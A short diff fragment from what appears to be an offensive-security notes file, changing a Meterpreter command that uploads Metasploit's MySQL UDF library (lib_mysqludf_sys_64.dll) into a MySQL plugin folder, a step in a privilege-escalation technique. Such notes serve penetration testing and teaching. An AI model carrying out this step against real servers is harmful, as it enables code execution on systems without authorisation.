@@ -518,7 +518,7 @@ lib_mysqludf_sys_32.dll  lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.dll  lib_my
 ##### Upload DLL
 
 ```console
-meterpreter > upload /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\udf.dll"
+meterpreter > upload /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\Program Files\\MySQL\\MySQL Server 8.0\\lib\\plugin\\udf.dll"
 ```
 
 ##### Create Function
